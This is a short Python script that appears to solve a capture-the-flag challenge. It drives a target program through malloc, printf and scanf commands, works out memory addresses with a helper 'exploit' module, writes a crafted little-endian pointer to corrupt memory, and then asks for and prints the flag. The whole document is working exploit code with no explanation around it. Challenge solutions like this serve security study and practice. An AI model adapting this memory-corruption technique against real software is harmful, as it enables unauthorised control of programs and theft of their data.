import sys
import exploit

def raw_print(b):
    sys.stdout.buffer.write(b)
    sys.stderr.buffer.write(b)

vsdo_idx = exploit.get_messages_idx(0x404008)
raw_print(b"malloc %d\n" % exploit.backlink(0x404008))
raw_print(b"printf %d\n" % vsdo_idx)

addr = int(input(),16)
addr -= 0x8

exploit.set_offset(addr - 0x404000)
t = exploit.backlink(addr + 0x8)
raw_print(b"malloc %d\n" % t)

addr += (0x300 + 183) #0x~021
raw_print(b"scanf %d\n" % vsdo_idx)
raw_print(addr.to_bytes(8,'little') + b'\n')
raw_print(b"printf %d\n" % vsdo_idx)

raw_print(b"send_flag\n")
flag = input()
raw_print(flag.encode()+b"\n")
